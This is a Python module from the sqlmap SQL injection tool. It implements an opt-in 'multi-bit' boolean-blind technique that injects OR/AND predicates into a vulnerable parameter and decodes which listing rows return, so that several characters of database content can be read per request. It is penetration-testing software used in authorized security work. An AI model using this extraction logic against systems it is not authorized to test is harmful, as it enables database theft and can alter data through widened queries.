#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

"""
Multi-bit blind inference ("row multiplexing"), used on demand ('--multi-bit').

Classic boolean-based blind reads ONE bit per request, because the oracle in comparison.py reduces a
response to True/False. On a listing page the response actually carries more: WHICH rows came back.
By making row N of the rendered query appear iff bit N of the target value is set, a single response
carries a whole bit vector - 8 bits per character, so several characters per request instead of eight
requests per character.

The switch is the permission: widening the result set with OR is what makes one response carry whole
characters, and that is a risk-3 operation in sqlmap's own policy (every "OR boolean-based blind" test
in boolean_blind.xml is <risk>3</risk>). Without it nothing here runs, and hint() merely says so once
on a target that would benefit.

The payload keeps the value expression exactly ONCE: the row identifier itself computes both the
character offset and the bit index (see the per-DBMS <bitmap> atom in queries.xml). Emitting one term
per bit instead would produce multi-kilobyte payloads that no real target accepts.

Correctness does NOT rest on the channel being clean. Every extracted value is proven back against
the target before it is returned (length plus chunk-wise equality, see _confirm), a canary row tells
an empty answer apart from a junk response, and any doubt returns None so that bisection() proceeds
untouched.
"""

import logging
import re
import time

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import dataToStdout
from lib.core.common import decodeIntToUnicode
from lib.core.common import filterControlChars
from lib.core.common import getTechnique
from lib.core.common import incrementCounter
from lib.core.common import isTechniqueAvailable
from lib.core.common import randomInt
from lib.core.common import setTechnique
from lib.core.common import singleTimeLogMessage
from lib.core.common import singleTimeWarnMessage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import PAYLOAD
from lib.core.settings import MAX_MULTIBIT_LENGTH
from lib.core.settings import MAX_MULTIBIT_PAGE
from lib.core.settings import MULTIBIT_BITS_PER_CHAR
from lib.core.settings import MULTIBIT_CALIBRATION_ROUNDS
from lib.core.settings import MULTIBIT_CANDIDATE_COLUMNS
from lib.core.settings import MULTIBIT_CONFIRM_CHUNK
from lib.core.settings import MULTIBIT_MAX_FAILURES
from lib.core.settings import MULTIBIT_MAX_PLANES
from lib.core.settings import MULTIBIT_MIN_BITS
from lib.core.settings import MULTIBIT_NARROW
from lib.core.settings import MULTIBIT_PLANES
from lib.core.settings import MULTIBIT_SAMPLES
from lib.core.settings import MULTIBIT_WIDEN
from lib.core.settings import MULTIBIT_WIDEN_RISK
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.xrange import xrange

try:
    from lib.utils import sgmllib
except ImportError:
    sgmllib = None

_TOKEN = re.compile(r'href="[^"]+"|[A-Za-z][A-Za-z0-9_\-]{3,}')

# row identity as real listing pages expose it:
#   /product.php?id=12        (?id=12, &pid=12)
#   data-id='12'              (data attribute)
#   /product/12               (path segment)
#   <input name='product_id' value='12'>   (form field, either attribute order)
_QUERY = re.compile(r'[?&]([A-Za-z_][A-Za-z0-9_]*)=["\']?(\d{1,9})(?!\d)')
_DATA = re.compile(r'\bdata-([A-Za-z_][A-Za-z0-9_]*)=["\']?(\d{1,9})(?!\d)')
_PATH = re.compile(r'/([A-Za-z_][A-Za-z0-9_]*)/(\d{1,9})(?!\d)')
_INPUT = re.compile(r'<input\b[^>]*>', re.I)
_INAME = re.compile(r'\bname\s*=\s*["\']?([A-Za-z_][A-Za-z0-9_]*)', re.I)
_IVALUE = re.compile(r'\bvalue\s*=\s*["\']?(\d{1,9})(?!\d)', re.I)

# page regions whose content is site chrome, not the result set: a nav menu, a currency switcher or a
# language picker repeats structurally just like rows do, so nothing inside these proves anything
_CHROME = frozenset(("head", "header", "nav", "footer", "aside", "script", "style", "noscript", "template"))

class _StructureParser(sgmllib.SGMLParser if sgmllib else object):
    """
    One pass over a page, collecting repeated sibling elements outside the site chrome.

    The tell-tale of a listing is REPEATED MARKUP: one row template stamped N times, so the same tag
    with the same attribute names appears N times under the same parent. Chrome repeats too, which
    is why header/nav/footer subtrees are excluded - only repeated structure in the page's own
    content can be the result set.
    """

    def __init__(self):
        if sgmllib:
            sgmllib.SGMLParser.__init__(self)

        self._open = []
        self.groups = {}

    def unknown_starttag(self, tag, attrs):
        self._open.append(tag)

        if not any(_ in _CHROME for _ in self._open[:-1]):
            parent = self._open[-2] if len(self._open) > 1 else None
            names = tuple(sorted(name for name, _ in attrs))
            self.groups.setdefault((parent, tag, names), []).append(attrs)

    def unknown_endtag(self, tag):
        if tag in self._open:
            while self._open and self._open[-1] != tag:
                self._open.pop()

            if self._open:
                self._open.pop()

def _debug(message):
    logger.debug("multi-bit: %s" % message)

def _page(expression, mode):
    """
    Runs an arbitrary boolean expression and returns the raw body.

    Two ways to attach it, and the difference is not cosmetic:

      WIDEN  - "... OR (predicate)" against a negated value, which makes the whole table addressable
               and the channel wide enough for several characters per request. It can also make an
               injected UPDATE/DELETE touch rows it otherwise would not, which is why every OR test
               in boundaries is risk 3 - and why this is what the switch buys.
      NARROW - "... AND (predicate)" on the live value. Can only ever REMOVE rows, so the channel is
               as wide as the rows the page already shows. The fallback for a result set no OR can
               widen (a fixed filter in a subquery the payload cannot escape).
    """

    if mode == MULTIBIT_WIDEN:
        payload = agent.payload(newValue=agent.suffixQuery(agent.prefixQuery("OR (%s)" % expression)), where=PAYLOAD.WHERE.NEGATIVE)
    else:
        payload = agent.payload(newValue=agent.suffixQuery(agent.prefixQuery("AND (%s)" % expression)), where=PAYLOAD.WHERE.ORIGINAL)

    page, _, _ = Request.queryPage(payload, content=True, raise404=False, silent=True)
    incrementCounter(getTechnique())

    return page or ""

def _tokens(expression, mode):
    return set(_TOKEN.findall(_page(expression, mode)))

def _stable(expression, mode, samples=MULTIBIT_SAMPLES):
    """Tokens present in EVERY sample - drops per-response junk (CSRF, timestamps, ads, request ids)."""

    retVal = None

    for _ in range(samples):
        current = _tokens(expression, mode)
        retVal = current if retVal is None else (retVal & current)

        if not retVal:
            break

    return retVal or set()

def _bitcol(column, base, bit):
    """Predicate 'bit `bit` of (column - base) is set', used to address rows in bulk."""

    return queries[Backend.getIdentifiedDbms()].bitcol.query % ("(%s-%d)" % (column, base), bit)

def _join(*expressions):
    return " AND ".join("(%s)" % _ for _ in expressions if _)

def _window(column, low, high):
    return "%s BETWEEN %d AND %d" % (column, low, high)

def _extract(page):
    """
    Yields (name, value) identifier pairs from the page's repeated content markup.

    Only elements that REPEAT structurally count - a listing is one row template stamped N times, so
    its identifiers sit inside elements whose tag, attribute names and parent tag recur. A single
    element proves nothing, and the site chrome (nav menus, switchers, scripts) is excluded outright:
    a single-row page is thus ruled out from the page alone, for free.
    """

    if not page:
        return

    if sgmllib is None:
        # no parser available (very new Python): the identifier forms alone, wherever they appear
        for key, value in _QUERY.findall(page) + _DATA.findall(page) + _PATH.findall(page):
            yield key, int(value)

        for tag in _INPUT.findall(page):
            name, value = _INAME.search(tag), _IVALUE.search(tag)

            if name and value:
                yield name.group(1), int(value.group(1))

        return

    parser = _StructureParser()

    try:
        parser.feed(page[:MAX_MULTIBIT_PAGE])
        parser.close()
    except Exception:
        return

    for (_, tag, _), members in parser.groups.items():
        if len(members) < 2:
            continue

        for attrs in members:
            if tag == "input":
                name = next((value for key, value in attrs if key == "name"), "")
                value = next((value for key, value in attrs if key == "value"), "")

                if name and value.isdigit() and len(value) <= 9:
                    yield name, int(value)
            else:
                for key, value in attrs:
                    if key == "href":
                        for name, digit in _QUERY.findall(value) + _PATH.findall(value):
                            yield name, int(digit)
                    elif key.startswith("data-") and len(key) > 5 and value.isdigit() and len(value) <= 9:
                        yield key[5:], int(value)

def _identifiers(page):
    """
    Row identifiers a response exposes, as real listing pages do it.

    A row identifier VARIES within one response; one that does not is page furniture (or the injected
    parameter reflected back), whatever it happens to be called.
    """

    retVal = {}

    for name, value in _extract(page):
        retVal.setdefault(name, set()).add(value)

    return dict((_, retVal[_]) for _ in retVal if len(retVal[_]) > 1)

def _discover(mode):
    """
    Finds a per-row discriminator column and the markers identifying each row.

    Cheap stages first, so a hopeless parameter costs a handful of requests instead of a linear scan:

      1. viability - a probe against an empty one, plus a smaller range that must show strictly fewer
         rows. A page that cannot show fewer rows when asked for fewer (pagination, truncation, a
         cache serving one body) is rejected here, before anything expensive is paid for.
      2. mapping   - row identities are resolved by BIT PLANE: request k selects every row whose
         offset from the base has bit k set, so a handful of requests place all of them. Probing
         identifiers one at a time would cost one request each.
    """

    if not queries[Backend.getIdentifiedDbms()].bitcol.query:
        _debug("no <bitcol> atom for %s" % Backend.getIdentifiedDbms())
        return None

    spread = {}

    # The page as the target itself serves it already lists row identifiers, and sqlmap has kept it
    # since the stability check - so the candidates cost nothing. Only when it yields none is it
    # worth asking for more rows (which, on a big table, is a big response).
    for candidate in (kb.originalPage,) + (None,) * MULTIBIT_SAMPLES:
        spread = _identifiers(candidate if candidate is not None else _page("1=1", mode))

        if spread:
            break

    if not spread:
        _debug("no row identifiers rendered in the response")
        return None

    empty = _stable("1=2", mode)

    for column in sorted(spread, key=lambda _: len(spread[_]), reverse=True)[:MULTIBIT_CANDIDATE_COLUMNS]:
        retVal = (_widen if mode == MULTIBIT_WIDEN else _narrow)(column, spread[column], empty, mode)

        if retVal:
            retVal.update(column=column, mode=mode)
            return retVal

    return None

def _narrow(column, known, empty, mode):
    """
    The channel the page already carries: its OWN rows, addressed by name. Identifiers are whatever
    the markup showed - they need not be consecutive, because the payload maps each one to a bit
    through a CASE rather than through arithmetic.
    """

    base = min(known) - 1
    pool = _stable("1=1", mode) - empty

    if len(pool) < MULTIBIT_MIN_BITS + 1:
        _debug("column '%s' exposes too little per-row content (%d markers)" % (column, len(pool)))
        return None

    # asking for the lower half of the identifiers must show strictly fewer rows
    inside = sorted(known)
    fewer = _stable(_window(column, base, (inside[0] + inside[-1]) // 2), mode) & pool

    if not (fewer < pool):
        _debug("column '%s' shows the same rows for fewer identifiers (truncation/cache)" % column)
        return None

    count = min(MULTIBIT_MAX_PLANES, max(1, (max(known) - base).bit_length()))
    rows = _place(_planes(column, base, mode, None, pool, count), pool, base, known)
    order = sorted(rows)

    if len(order) < MULTIBIT_MIN_BITS + 1:
        _debug("column '%s' yields only %d usable rows on the page" % (column, len(order)))
        return None

    # one row is the canary (selected regardless of the data), the rest carry bits
    return {"rows": rows, "canary": order[-1], "keys": order[:-1][:MULTIBIT_BITS_PER_CHAR], "perCall": 1}

def _widen(column, known, empty, mode):
    """
    The whole table, addressed by a window of consecutive identifiers so that one compact payload can
    carry several characters: the identifier itself computes both the character offset and the bit.
    """

    span = 1 << MULTIBIT_PLANES

    # Centre the window on the identifiers the page itself renders, so tables that do not start at 1
    # (or at all) are still reachable. Offsets are counted from base = low - 1 so that they start at
    # ONE: an offset of zero sets no bit in any plane, which is indistinguishable from a marker that
    # went missing, and it would cost the first row of every window.
    low = max(1, min(known) - span // 2)
    base = low - 1
    high = base + span - 1
    window = _window(column, low, high)

    pool = _stable(window, mode) - empty

    if len(pool) < MULTIBIT_BITS_PER_CHAR + 1:
        _debug("column '%s' exposes too little per-row content (%d markers)" % (column, len(pool)))
        return None

    # Asking for a range that leaves out an identifier known to exist must show strictly fewer rows.
    # The cut is anchored on real identifiers CLIPPED TO THE WINDOW - halving the window proves
    # nothing on a table smaller than it (15 products list the same for 1..64 as for 1..128), and
    # halving the identifiers proves nothing on a table larger than it (with ids up to 1000 the
    # "smaller" range would be wider than the window itself).
    inside = sorted(_ for _ in known if low <= _ <= high) or sorted(known)
    fewer = _stable(_window(column, low, (inside[0] + inside[-1]) // 2), mode) & pool

    if not (fewer < pool):
        _debug("column '%s' shows the same rows for a smaller range (pagination/truncation/cache)" % column)
        return None

    rows = _place(_planes(column, base, mode, window, pool, MULTIBIT_PLANES), pool, base, None)

    # the payload derives char offset and bit index from (id - base), so ids must be consecutive
    run = _longestRun(rows)

    if len(run) < MULTIBIT_BITS_PER_CHAR + 1:
        _debug("column '%s' yields only %d consecutive usable rows" % (column, len(run)))
        return None

    canary = run.pop()                              # unconditionally selected on every read

    while len(run) % MULTIBIT_BITS_PER_CHAR:        # whole characters only
        run.pop()

    return {"rows": dict((_, rows[_]) for _ in run + [canary]), "canary": canary,
            "keys": run, "base": run[0], "perCall": len(run) // MULTIBIT_BITS_PER_CHAR}

def _planes(column, base, mode, restrict, pool, count):
    """
    The bit planes of the row identifiers: plane k holds the markers of every row whose offset from
    the base has bit k set, so `count` requests place up to 2**count rows.

    An empty plane ABOVE every non-empty one simply means the identifiers do not reach that far. An
    empty one BELOW them is a bad response, and re-probing it is far cheaper than letting it shift
    every identifier by that bit.
    """

    def probe(bit):
        return _tokens(_join(restrict, _bitcol(column, base, bit)), mode) & pool

    retVal = [probe(_) for _ in range(count)]
    top = max([_ for _ in range(count) if retVal[_]] or [0])

    for bit in range(top):
        if not retVal[bit]:
            retVal[bit] = probe(bit)

    return retVal

def _place(planes, pool, base, known):
    """Turns the bit planes into 'row identifier -> the markers that identify only that row'."""

    useful = [_ for _ in planes if _]

    # Markers common to every plane that selected anything carry no identity - they are the shared
    # row markup ("item", "class", ...). Intersecting ALL the planes instead would remove nothing
    # when the high planes are empty for want of rows, and the markup would then be placed at a row
    # identifier that does not exist (and, being the last one, would be picked as the canary).
    pool = pool - (set.intersection(*useful) if useful else pool)

    identity = {}

    for token in pool:
        value = 0

        for bit in range(len(planes)):
            if token in planes[bit]:
                value |= 1 << bit

        if value:                                   # a marker in no plane at all is junk, not a row
            identity.setdefault(base + value, set()).add(token)

    if known:                                       # only identifiers the markup really showed
        identity = dict((_, identity[_]) for _ in identity if _ in known)

    return _exclusive(identity)

def _exclusive(identity):
    """Keeps only markers that identify ONE row - shared markup is worthless as a bit."""

    retVal = {}

    for rid, tokens in identity.items():
        others = set()

        for other, more in identity.items():
            if other != rid:
                others |= more

        unique = tokens - others

        if unique:
            retVal[rid] = unique

    return retVal

def _longestRun(rows):
    """The payload derives char offset and bit index from (id - base), so ids must be consecutive."""

    best, run = [], []

    for k in sorted(rows):
        run = (run + [k]) if (run and k == run[-1] + 1) else [k]

        if len(run) > len(best):
            best = list(run)

    return best

def _selected(profile, expression):
    """One request -> the set of bit rows the target selected. None when the response itself was junk."""

    rows, canary = profile["rows"], profile["canary"]

    # the canary is OR-ed INSIDE the predicate, so even in narrow mode the result set stays a subset
    # of the page's own rows
    observed = _tokens("(%s) OR %s=%d" % (expression, profile["column"], canary), profile["mode"])

    if not rows[canary] & observed:
        return None                                 # canary missing -> gateway error, interstitial, ...

    return set(_ for _ in profile["keys"] if rows[_] & observed)

def _calibrate(profile):
    """
    Proves superposition at FULL read width: tokens(A union B) == tokens(A) union tokens(B). This is
    the gate that rejects paginated, truncated and deduplicating pages, where selecting extra rows
    pushes others out. Subsets are expressed with the same compact bit arithmetic the reader uses, so
    the calibration payload is the size of a real one.
    """

    column, keys = profile["column"], profile["keys"]
    base = keys[0] - 1
    planes = max(1, (keys[-1] - base).bit_length())
    everything = " OR ".join("%s=%d" % (column, _) for _ in keys)

    # every row at once (the read-width test), then no row at all - the latter proves the canary is a
    # real row rather than shared markup that merely follows "some row was rendered"
    rounds = [(everything, set(keys)), ("%s AND NOT (%s)" % (_bitcol(column, base, 0), _bitcol(column, base, 0)), set())]

    for _ in range(MULTIBIT_CALIBRATION_ROUNDS):
        i, j = randomInt() % planes, randomInt() % planes
        negate = bool(randomInt() % 2)
        expression = "%s AND %s(%s)" % (_bitcol(column, base, i), "NOT " if negate else "", _bitcol(column, base, j))
        expected = set(_ for _ in keys if ((_ - base) >> i) & 1 and (bool(((_ - base) >> j) & 1) != negate))
        rounds.append((expression, expected))

    for expression, expected in rounds:
        observed = _selected(profile, expression)

        if observed is None or observed != expected:
            _debug("superposition failed (%d rows expected, %s observed)" % (len(expected), "junk" if observed is None else len(observed)))
            return False

    return True

def _read(profile, expression, position, count):
    """
    One request -> `count` characters in widen mode; one character (in as many requests as the page
    has bit rows) in narrow mode. Returns a list of ordinals (0 marks end of value), or None when a
    response itself was junk (told apart by the canary row, selected regardless of the data).
    """

    if profile["mode"] == MULTIBIT_WIDEN:
        return _readWide(profile, expression, position, count)

    column, keys = profile["column"], profile["keys"]
    bitchar = queries[Backend.getIdentifiedDbms()].bitchar.query

    # the row identifiers need not be consecutive here, so a CASE maps each one to the bit it carries
    # - the value expression itself still appears exactly once
    choice = "CASE %s%s END" % (column, "".join(" WHEN %d THEN %d" % (_, index) for index, _ in enumerate(keys)))
    value = 0

    for offset in range(0, MULTIBIT_BITS_PER_CHAR, len(keys)):
        observed = _selected(profile, bitchar % (expression, position, "%s+%d" % (choice, offset) if offset else choice))

        if observed is None:
            return None

        for index, key in enumerate(keys):
            if offset + index < MULTIBIT_BITS_PER_CHAR and key in observed:
                value |= 1 << (offset + index)

    return [value]

def _readWide(profile, expression, position, count):
    column, base, keys = profile["column"], profile["base"], profile["keys"]
    bits = MULTIBIT_BITS_PER_CHAR
    top = base + count * bits - 1

    # 1+FLOOR((id-shifted)/bits) == position+FLOOR((id-base)/bits); parenthesized because it goes
    # negative past the first window (and "id--40" would start a comment)
    shifted = "(%d)" % (base - bits * (position - 1))
    bitmap = queries[Backend.getIdentifiedDbms()].bitmap.query % (expression, column, shifted, bits, column, shifted, bits)
    observed = _selected(profile, _join(_window(column, base, top), bitmap))

    if observed is None:
        return None

    retVal = []

    for c in range(count):
        value = 0

        for b in range(bits):
            if keys[c * bits + b] in observed:
                value |= 1 << b

        retVal.append(value)

    return retVal

def _ask(profile, predicate):
    """One request -> one bit, over the row channel (so it inherits the canary's junk detection)."""

    marker = profile["keys"][0]
    observed = _selected(profile, "%s=%d AND (%s)" % (profile["column"], marker, predicate))

    return None if observed is None else (marker in observed)

def _confirm(profile, expression, value, length):
    """
    Proves the WHOLE extracted value back against the target: its length, then equality chunk by
    chunk. This is what makes the technique safe on hostile pages - a junk response, a dropped row or
    a character the 8-bit channel cannot carry all end up as a mismatch here, never as output.

    True when proven, False when the channel is at fault, None when THIS value simply cannot be
    proven (nothing wrong with the channel, so it must not count against it).
    """

    dbms = Backend.getIdentifiedDbms()

    # A channel that drops rows reads zero bits and stops early, so the LENGTH is what implicates it.
    # A character mismatch at the right length is about this value instead - 8 bits per character
    # cannot reproduce every ordinal a DBMS may return (a multi-byte code, a codepoint above 255
    # whose low byte still looks like ASCII), and that must not count against a working channel.
    if length is None:
        if _ask(profile, "%s=%d" % (queries[dbms].length.query % ("(%s)" % expression), len(value))) is not True:
            # a NULL value has no length, so the comparison above is NULL (i.e. not selected) no matter
            # what was read - exactly how a channel that drops rows fails it. One extra probe tells the
            # two apart, so a column with NULLs in it does not retire an otherwise working channel
            if _ask(profile, "(%s) IS NULL" % expression) is True:
                _debug("value is NULL, so its length cannot be confirmed")
                return None

            _debug("length of the extracted value did not confirm")
            return False
    elif length != len(value):
        _debug("extracted %d characters, expected %d" % (len(value), length))
        return False

    for offset in range(0, len(value), MULTIBIT_CONFIRM_CHUNK):
        chunk = value[offset:offset + MULTIBIT_CONFIRM_CHUNK]
        escaped = unescaper.escape("'%s'" % chunk.replace("'", "''"))

        if "'" in escaped and not conf.noEscape:
            # the DBMS-specific escaper stood down (e.g. EXCLUDE_UNESCAPE matched the data itself), so
            # the literal would enter the payload quoted and could break the boundary
            _debug("chunk at offset %d could not be escaped" % offset)
            return None

        if _ask(profile, "(%s)=%s" % (queries[dbms].substring.query % ("(%s)" % expression, offset + 1, len(chunk)), escaped)) is not True:
            _debug("chunk at offset %d did not confirm" % offset)
            return None

    return True

def _usable(charsetType, partial):
    """The single-bit paths own everything multi-bit cannot reproduce exactly."""

    if not conf.multiBit or partial:
        return False                                # opt-in only, and a resumed value starts mid-string

    if getTechnique() != PAYLOAD.TECHNIQUE.BOOLEAN or kb.nullConnection:
        return False

    if conf.firstChar or conf.lastChar or charsetType is not None or kb.data.get("processChar"):
        return False                                # range-limited / restricted-charset / post-processed output

    if not kb.injection or not kb.injection.parameter:
        return False

    return _atoms()

def _atoms():
    """Whether the fingerprinted back-end has the bit arithmetic the channel is built from."""

    try:
        return bool(queries[Backend.getIdentifiedDbms()].bitchar.query and queries[Backend.getIdentifiedDbms()].bitcol.query)
    except Exception:
        return False

def _verbose():
    """Whether bisection is drawing the value on an open "retrieved: " line right now."""

    return conf.verbose in (1, 2) and not any((conf.eta, conf.api, kb.bruteMode, kb.multiThreadMode))

def _finish(profile, key):
    """Stores the discovered channel and reports what it measured."""

    profile.update(key=key, verified=False, attempts=0, failures=0)
    kb.multibit[key] = profile

    if profile["mode"] == MULTIBIT_WIDEN:
        width = "%d character%s" % (profile["perCall"], "s" if profile["perCall"] > 1 else "")
    else:
        width = "%d bits" % len(profile["keys"])

    logger.info("parameter '%s' carries a multi-bit channel (%s, %d rows, %s per request)" % (kb.injection.parameter, profile["mode"], len(profile["rows"]), width))

    return profile

def hint():
    """
    Says the one thing worth saying about multi-bit on this target, at most once and NOT ONE REQUEST:
    the page sqlmap already kept from the stability check is the whole evidence. Without the switch
    that is a nudge towards it, with the switch it is the back-end that cannot carry it. Either way
    only when boolean-based blind is the channel the run would use anyway (an in-band one is faster
    than any row channel). Purely advisory, never raises.
    """

    try:
        if kb.multibitHinted:
            return

        kb.multibitHinted = True

        if not isTechniqueAvailable(PAYLOAD.TECHNIQUE.BOOLEAN) or kb.nullConnection:
            return

        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR)):
            return

        if conf.multiBit:
            if not _atoms():
                singleTimeWarnMessage("switch '--multi-bit' is not supported for %s" % Backend.getIdentifiedDbms())

            return

        rows = max([len(_) for _ in _identifiers(kb.originalPage).values()] or [0])

        if rows > MULTIBIT_MIN_BITS and _atoms():
            singleTimeLogMessage("target renders %d rows that a single response could carry data in. You can try switch "
                                  "'--multi-bit' to read several characters per request instead of one bit. Though "
                                  "it widens the result set with OR payloads, as '--risk=%d' does" % (rows, MULTIBIT_WIDEN_RISK), level=logging.INFO)
    except Exception:
        pass

def _verify(profile, expression, bisectChar):
    """
    Cross-checks the channel against the trusted single-bit oracle, once per injection point.

    Deliberately separate from discovery: the check reads the first character of whatever value
    happens to come first, and an empty or non-ASCII one settles nothing. Such a value defers the
    check to the next one instead of condemning a channel that calibrated cleanly.
    """

    profile["attempts"] += 1
    getCurrentThreadData().shared.value = ""     # getChar() reads it, and bisection only seeds it further down
    reference = bisectChar(1)
    probe = _read(profile, expression, 1, 1)

    if probe is None or not reference or ord(reference) > 127:
        _debug("first character of this value cannot settle the cross-check, deferring")
    elif decodeIntToUnicode(probe[0]) == reference:
        profile["verified"] = True
        return True
    else:
        _debug("first character disagreed with the boolean oracle (%r vs %r)" % (probe, reference))
        profile["attempts"] = MULTIBIT_MAX_FAILURES     # a real disagreement, not an unlucky value

    if profile["attempts"] >= MULTIBIT_MAX_FAILURES:
        _debug("channel abandoned, the boolean oracle never confirmed it")
        kb.multibit[profile["key"]] = False

    return False

def _profile(expression, bisectChar):
    """Discovers and calibrates the channel ONCE per injection point, then has it cross-checked."""

    key = "%s|%s|%s|%s" % (conf.hostname or "", conf.path or "", kb.injection.place or "", kb.injection.parameter)
    profile = kb.multibit.get(key)

    if profile is False:
        return None

    if profile is None:
        kb.multibit[key] = False                    # pessimistic: any exit below leaves it latched off

        # The switch is the permission, so the whole table is fair game: the wide channel reads several
        # characters per request, the page's own rows only as many bits as it renders.
        for mode in (MULTIBIT_WIDEN, MULTIBIT_NARROW):
            profile = _discover(mode)

            if profile and _calibrate(profile):
                break

            profile = None

        if not profile:
            _debug("no usable row channel on this parameter")   # quiet: bisection carries on below
            return None

        if _verbose():
            dataToStdout("\n")                      # bisection has already printed "retrieved: "

        profile = _finish(profile, key)

        if _verbose():
            dataToStdout("[%s] [INFO] retrieved: " % time.strftime("%X"))

    if not profile["verified"] and not _verify(profile, expression, bisectChar):
        return None

    return profile

def _readChunk(profile, expression, position, count):
    """
    One read of `count` characters, with a single retry - a transient junk response (a gateway error,
    an interstitial) must not cost the whole value.
    """

    try:
        retVal = _read(profile, expression, position, count)

        return retVal if retVal is not None else _read(profile, expression, position, count)
    except Exception as ex:
        _debug("read at position %d failed (%s)" % (position, ex))

        return None

def _chunks(length, perCall):
    """(position, count) pairs covering the whole value, or None while its length is unknown."""

    if not (isinstance(length, int) and length > 0):
        return None

    return [(1 + _, min(perCall, length - _)) for _ in xrange(0, length, perCall)]

def _serial(profile, expression, chunks, perCall):
    """
    Chunk after chunk. Without a known length this is the only way, since the value ends where the
    channel reads a zero ordinal.
    """

    retVal, done = u"", False

    for position, count in chunks or ((_, perCall) for _ in xrange(1, MAX_MULTIBIT_LENGTH, perCall)):
        chunk = _readChunk(profile, expression, position, count)

        if chunk is None:
            _debug("channel stopped answering at position %d" % position)
            return None

        for value in chunk:
            if not value:                           # end of value (or a NUL, which classic cannot carry either)
                done = True
                break

            retVal += decodeIntToUnicode(value)

        if _verbose():
            dataToStdout(filterControlChars(retVal[position - 1:]))

        if done:
            break

    if not (done or chunks):
        _debug("value exceeded the %d character ceiling" % MAX_MULTIBIT_LENGTH)
        return None

    return retVal

def _parallel(profile, expression, chunks, numThreads):
    """
    The same reads spread over '--threads'. Every chunk sits at a known position, so they are as
    independent as the characters the single-bit path parallelises over. Multi-bit runs its OWN
    workers: bisection's read one character each, which would leave most of the channel idle.
    """

    pending, values = list(chunks), {}

    def readThread():
        while kb.threadContinue:
            with kb.locks.multibit:
                if not pending:
                    return

                position, count = pending.pop(0)

            chunk = _readChunk(profile, expression, position, count)

            if chunk is None:
                _debug("channel stopped answering at position %d" % position)
                kb.threadContinue = False
                return

            with kb.locks.value:
                values[position] = chunk

    technique = getTechnique()                      # runThreads' cleanup clears it (and releases every lock)

    try:
        runThreads(numThreads, readThread, startThreadMsg=False)
    finally:
        setTechnique(technique)

    retVal, done = u"", False

    for position, _ in chunks:
        if position not in values:                  # a chunk that never answered leaves a hole
            return None

        for value in values[position]:
            if not value:                           # a value shorter than the length it announced
                done = True
                break

            retVal += decodeIntToUnicode(value)

        if done:
            break

    if _verbose():                                  # the workers ran muted, so the value appears at once
        dataToStdout(filterControlChars(retVal))

    return retVal

def attempt(expression, bisectChar, length=None, charsetType=None, partial=False):
    """
    Returns the extracted value, or None if multi-bit is not usable here (caller falls back to
    classic bisection). `bisectChar(position)` is the trusted single-bit extractor.
    """

    if not _usable(charsetType, partial):
        return None

    with kb.locks.multibit:
        try:
            profile = _profile(expression, bisectChar)
        except Exception as ex:
            _debug("profiling failed (%s)" % ex)
            return None

    if not profile:
        return None

    # Discovery is paid once per injection point, so even short values (table and column names) are
    # cheaper here afterwards - a single character is not, since confirming it costs as much as
    # bisecting it.
    if isinstance(length, int) and length < 2:
        return None

    chunks = _chunks(length, profile["perCall"])

    # a value-parallel enumeration worker is already one thread of several, so it reads on its own
    numThreads = 1 if kb.multiThreadMode else min(conf.threads or 1, len(chunks or ()))

    if numThreads > 1:
        retVal = _parallel(profile, expression, chunks, numThreads)
    else:
        retVal = _serial(profile, expression, chunks, profile["perCall"])

    if retVal is None:
        return None

    try:
        confirmed = _confirm(profile, expression, retVal, length)
    except Exception as ex:
        _debug("confirmation failed (%s)" % ex)
        confirmed = False

    if confirmed is not True:
        if _verbose():
            dataToStdout("\r[%s] [INFO] retrieved: %s\r[%s] [INFO] retrieved: " % (time.strftime("%X"), " " * len(retVal), time.strftime("%X")))

        singleTimeWarnMessage("multi-bit inference could not confirm a value, falling back to single-bit")

        # a value the channel cannot carry (non-ASCII, or data the unescaper stands down on) is
        # nobody's fault; a channel that keeps disagreeing costs a full read plus a confirmation on
        # every value, so only that counts towards giving up on it
        if confirmed is None:
            return None

        profile["failures"] += 1

        if profile["failures"] >= MULTIBIT_MAX_FAILURES:
            _debug("channel abandoned after %d unconfirmed values" % profile["failures"])
            kb.multibit[profile["key"]] = False

        return None

    profile["failures"] = 0

    return retVal
